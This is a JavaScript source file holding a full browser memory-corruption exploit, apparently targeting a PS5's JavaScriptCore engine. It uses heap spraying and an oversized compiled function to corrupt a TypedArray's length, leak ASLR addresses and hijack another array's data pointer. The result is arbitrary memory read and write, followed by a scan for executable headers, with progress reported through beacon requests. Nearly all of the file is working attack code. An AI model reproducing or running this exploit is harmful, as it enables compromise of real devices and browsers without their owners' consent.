// p152a — Full exploit: Phase 0 golden primitive → arbitrary R/W
//
// Attack chain:
// 1. Bait-and-switch spray → MetadataTable fills freed hole
// 2. finishCreation OOB sweep corrupts target TypedArray m_length
// 3. ASLR leak from corrupted length (= thunk address)
// 4. OOB scan for uncorrupted search target cells (MarkedSpace pattern match)
// 5. Identify corresponding JS object via unique m_length
// 6. Redirect m_vector → arbitrary read/write
//
// Beacon prefix: V152A-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V152A-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  function rU32(ta, o) {
    return (ta[o] | (ta[o+1] << 8) | (ta[o+2] << 16) | ((ta[o+3] << 24) >>> 0)) >>> 0;
  }

  function rHex8(ta, o) {
    var h = '';
    for (var i = 7; i >= 0; i--) h += hexB(ta[o + i]);
    return h;
  }

  function wU32(ta, o, v) {
    ta[o] = v & 0xFF; ta[o+1] = (v >> 8) & 0xFF;
    ta[o+2] = (v >> 16) & 0xFF; ta[o+3] = (v >> 24) & 0xFF;
  }

  function wU64(ta, o, lo, hi) { wU32(ta, o, lo); wU32(ta, o + 4, hi); }

  BS('BOOT');

  // ---- Config ----
  var BUF_SZ = 100096;
  var SPRAY_N = 300;
  var TARG_N = 2000;
  // Search targets: unique lengths for OOB cell identification
  // m_length = SEARCH_BASE + s, bytes = [0x39+s, 0x30, 0, 0, 0, 0, 0, 0]
  // Quick check: byte[25] === 0x30 (second byte of m_length)
  var SEARCH_BASE = 12345; // 0x3039
  var SEARCH_N = 100;
  var N = 38348816;
  var SCAN_CAP = 200 * 1024 * 1024;

  // ---- Phase 1: Bait-and-switch spray ----
  var sprays = [], sViews = [];
  for (var i = 0; i < SPRAY_N; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    sprays.push(ab);
    sViews.push(new Uint8Array(ab));
  }
  for (var i = 0; i < SPRAY_N; i += 2) { sprays[i] = null; sViews[i] = null; }
  for (var g = 0; g < 8; g++) {
    var gb = new Array(50000);
    for (var j = 0; j < 50000; j++) gb[j] = new ArrayBuffer(256);
    gb = null;
  }
  BS('P1-DONE');

  // ---- Phase 2: Allocate targets ----
  // 2A: Corruption targets — small, for Phase 0 m_length detection
  var targets = [];
  for (var t = 0; t < TARG_N; t++) targets.push(new Uint8Array(16));

  // 2B: Search targets — unique lengths for cell identification in OOB scan
  // Each cell has m_length = SEARCH_BASE + s → identifiable through OOB
  var stArr = [];
  for (var s = 0; s < SEARCH_N; s++) {
    var st = new Uint8Array(SEARCH_BASE + s);
    st[0] = 0xDE; st[1] = 0xAD; st[2] = s; st[3] = (~s) & 0xFF;
    stArr.push(st);
  }

  // Pre-allocate read buffer (no allocation after corruption)
  var rBuf = new Uint8Array(256);
  BS('P2-T' + TARG_N + '-S' + SEARCH_N);

  // ---- Phase 3: Compile 38M function ----
  BS('P3-BUILD');
  var CHUNK = 4000000;
  var nC = Math.floor(N / CHUNK), rem = N - nC * CHUNK;
  var cc = 'a();'.repeat(CHUNK);
  var parts = new Array(nC + 3);
  parts[0] = 'window.__p152fn=function(a){';
  for (var c = 0; c < nC; c++) parts[1 + c] = cc;
  parts[nC + 1] = 'a();'.repeat(rem);
  parts[nC + 2] = '};window.__p152ok=1;';
  cc = null;
  var blob = new Blob(parts, { type: 'application/javascript' });
  BS('P3-BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('P3-ERR'); };
  sc.onload = function() {
    BS('P3-' + (window.__p152ok ? 'OK' : 'FAIL'));
    if (window.__p152ok) run();
  };
  document.head.appendChild(sc);
  sc.src = url;

  // ---- Main exploit logic (runs after compilation) ----
  function run() {

    // ---- Phase 4: Find corrupted target ----
    var oob = null, oobLen = 0, cN = 0;
    for (var t = 0; t < TARG_N; t++) {
      var l = targets[t].length;
      if (l !== 16) {
        cN++;
        if (!oob && l > 0x10000) { oob = targets[t]; oobLen = l; }
      }
    }
    BS('P4-C' + cN + (oob ? '-ASLR-' + oobLen.toString(16) : '-NONE'));

    if (!oob) { sprayFallback(); return; }

    // ---- Phase 5: Heap survey ----
    var d = '';
    for (var i = 16; i < 80 && i < oobLen; i++) d += hexB(oob[i]);
    BS('P5-NEAR-' + d);

    var mbs = [1, 10, 50, 100];
    for (var mi = 0; mi < mbs.length; mi++) {
      var mOff = mbs[mi] * 1048576;
      if (mOff + 16 > oobLen) break;
      d = '';
      for (var i = 0; i < 16; i++) d += hexB(oob[mOff + i]);
      BS('P5-' + mbs[mi] + 'MB-' + d);
    }

    // ---- Phase 6: Cell scan ----
    // Looking for JSArrayBufferView cells with m_length in [SEARCH_BASE, SEARCH_BASE+99]
    // Cell layout: +8 butterfly(8B) +16 m_vector(8B) +24 m_length(8B) +40 m_mode(1B)
    // Pattern: m_length[1]=0x30, m_length[0] in [0x39,0x9C], m_length[2..7]=0, m_mode=0x10
    BS('P6-SCAN');
    var limit = Math.min(oobLen, SCAN_CAP);
    var found = [];

    for (var off = 0; off + 48 <= limit && found.length < 10; off += 16) {
      if (oob[off + 25] !== 0x30) continue;
      var lb = oob[off + 24];
      if (lb < 0x39 || lb > 0x9C) continue;
      if (oob[off + 26] !== 0 || oob[off + 27] !== 0) continue;
      if (oob[off + 28] !== 0 || oob[off + 29] !== 0 ||
          oob[off + 30] !== 0 || oob[off + 31] !== 0) continue;
      if (oob[off + 40] !== 0x10) continue;

      var idx = rU32(oob, off + 24) - SEARCH_BASE;
      if (idx < 0 || idx >= SEARCH_N) continue;

      var vLo = rU32(oob, off + 16);
      var vHi = rU32(oob, off + 20);

      // Validate m_vector looks like a real pointer
      if (vLo === 0 && vHi === 0) continue;
      if (vHi >= 0xFFFF0000) continue;
      if (vHi === 0 && vLo < 0x10000) continue;

      found.push({ off: off, idx: idx, vLo: vLo, vHi: vHi });
      if (found.length <= 3) {
        BS('P6-HIT' + found.length + '-O' + off.toString(16) + '-S' + idx + '-V' + rHex8(oob, off + 16));
      }
    }

    BS('P6-FOUND-' + found.length + '-IN-' + Math.round(limit / 1048576) + 'MB');

    if (found.length === 0) {
      BS('P6-NOCELL');
      sprayFallback();
      return;
    }

    // ---- Phase 7: Verify + redirect ----
    var cell = null, sIdx = -1, pivot = null;

    for (var fi = 0; fi < found.length; fi++) {
      var c = found[fi];
      var p = stArr[c.idx];
      var ok = false;
      try { ok = (p[0] === 0xDE && p[1] === 0xAD && p[2] === c.idx); } catch(e) {}
      if (ok) {
        cell = c; sIdx = c.idx; pivot = p;
        BS('P7-PIVOT-S' + sIdx + '-O' + c.off.toString(16));
        break;
      }
    }

    if (!pivot) {
      BS('P7-NO-VALID-PIVOT');
      sprayFallback();
      return;
    }

    // Overwrite m_vector to thunk address — test arbitrary read
    var thunkLo = oobLen & 0xFFFFFFFF;
    var thunkHi = Math.floor(oobLen / 0x100000000) & 0xFFFF;
    var oVLo = cell.vLo, oVHi = cell.vHi;

    wU64(oob, cell.off + 16, thunkLo, thunkHi);
    d = '';
    for (var i = 0; i < 16; i++) d += hexB(pivot[i]);
    wU64(oob, cell.off + 16, oVLo, oVHi);

    BS('P7-CODE-' + d);

    // Verify restoration
    var rok = false;
    try { rok = (pivot[0] === 0xDE && pivot[1] === 0xAD); } catch(e) {}
    if (!rok) {
      BS('P7-RESTORE-FAIL');
      return;
    }

    // ---- Phase 8: Arbitrary R/W confirmed ----
    BS('P8-ARB-RW-READY');

    function arbRead(aLo, aHi, cnt) {
      cnt = Math.min(cnt, pivot.length, 256);
      wU64(oob, cell.off + 16, aLo, aHi);
      for (var i = 0; i < cnt; i++) rBuf[i] = pivot[i];
      wU64(oob, cell.off + 16, oVLo, oVHi);
    }

    function hexAt(aLo, aHi, cnt) {
      arbRead(aLo, aHi, cnt);
      var h = '';
      for (var i = 0; i < cnt; i++) h += hexB(rBuf[i]);
      return h;
    }

    function arbWrite(aLo, aHi, data, cnt) {
      wU64(oob, cell.off + 16, aLo, aHi);
      for (var i = 0; i < cnt; i++) pivot[i] = data[i];
      wU64(oob, cell.off + 16, oVLo, oVHi);
    }

    // Read 32 bytes at thunk
    BS('P8-THUNK-' + hexAt(thunkLo, thunkHi, 32));

    // Read code page base (4KB aligned)
    var pgLo = thunkLo & 0xFFFFF000;
    BS('P8-PAGE-' + pgLo.toString(16) + '-' + hexAt(pgLo, thunkHi, 32));

    // Scan backward from thunk for ELF header (7F 45 4C 46) or Mach-O (CF FA ED FE)
    var baseFound = false;
    for (var scan = pgLo; scan > pgLo - 0x1000000 && scan > 0; scan -= 0x1000) {
      arbRead(scan, thunkHi, 4);
      if (rBuf[0] === 0x7F && rBuf[1] === 0x45 && rBuf[2] === 0x4C && rBuf[3] === 0x46) {
        BS('P8-ELF-' + scan.toString(16));
        BS('P8-HDR-' + hexAt(scan, thunkHi, 64));
        baseFound = true;
        break;
      }
      if (rBuf[0] === 0xCF && rBuf[1] === 0xFA && rBuf[2] === 0xED && rBuf[3] === 0xFE) {
        BS('P8-MACHO-' + scan.toString(16));
        BS('P8-HDR-' + hexAt(scan, thunkHi, 64));
        baseFound = true;
        break;
      }
    }
    if (!baseFound) BS('P8-NO-HDR-16MB');

    // Store globally for interactive use
    window.__ps5 = {
      read: arbRead, write: arbWrite, hex: hexAt,
      thunk: oobLen, thunkLo: thunkLo, thunkHi: thunkHi
    };

    BS('EXPLOIT-COMPLETE');
  }

  // ---- Fallback: spray scan for ASLR leak ----
  function sprayFallback() {
    BS('SPRAY-FALLBACK');
    var hits = 0;
    for (var i = 1; i < sViews.length; i += 2) {
      var v = sViews[i];
      if (!v) continue;
      var nz = 0;
      for (var j = 0; j < 112; j++) { if (v[j]) nz++; }
      if (nz > 0) {
        hits++;
        if (hits <= 3) BS('SPRAY-' + i + '-PTR-' + rHex8(v, 24));
      }
    }
    BS('SPRAY-HITS-' + hits);
    BS('DONE-FALLBACK');
  }
})();
